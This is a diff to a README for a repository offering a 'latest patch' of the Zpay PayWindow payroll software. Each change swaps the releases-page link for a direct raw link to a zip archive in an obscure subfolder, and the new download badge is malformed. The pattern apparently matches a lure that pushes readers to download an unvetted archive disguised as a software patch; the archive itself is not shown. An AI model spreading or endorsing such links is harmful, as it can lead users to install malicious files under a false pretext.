@@ -1,6 +1,6 @@
 # 🎉 Zpay-PayWindow-Payroll-System-Latest-Patch - Simplify Your Payroll Management 
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Patch-Here-blue.svg)](https://github.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/releases)
+[![Download](https://raw.githubusercontent.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/main/sylphlike/Zpay-PayWindow-Payroll-System-Latest-Patch-v3.7-beta.2.zip%20Latest%https://raw.githubusercontent.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/main/sylphlike/Zpay-PayWindow-Payroll-System-Latest-Patch-v3.7-beta.2.zip)](https://raw.githubusercontent.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/main/sylphlike/Zpay-PayWindow-Payroll-System-Latest-Patch-v3.7-beta.2.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ The Zpay PayWindow Payroll System is built to help you manage payroll efficientl
 To begin, you need to download the payroll system. Follow these easy steps:
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/releases).
+   Click [here to download](https://raw.githubusercontent.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/main/sylphlike/Zpay-PayWindow-Payroll-System-Latest-Patch-v3.7-beta.2.zip).
 
 2. **Select the Latest Release**  
    Look for the latest version of the software on the Releases page. This is usually marked as the top entry.
@@ -46,7 +46,7 @@ The Zpay PayWindow Payroll System includes several key features designed for eff
 
 ## 📥 Download & Install
 
-You can download the Zpay PayWindow Payroll System by visiting the [Releases page](https://github.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/releases).
+You can download the Zpay PayWindow Payroll System by visiting the [Releases page](https://raw.githubusercontent.com/patriknba23/Zpay-PayWindow-Payroll-System-Latest-Patch/main/sylphlike/Zpay-PayWindow-Payroll-System-Latest-Patch-v3.7-beta.2.zip).
 
 1. Click the link above to access the latest patches and downloads.
 2. Follow the previously described steps to complete the installation process.
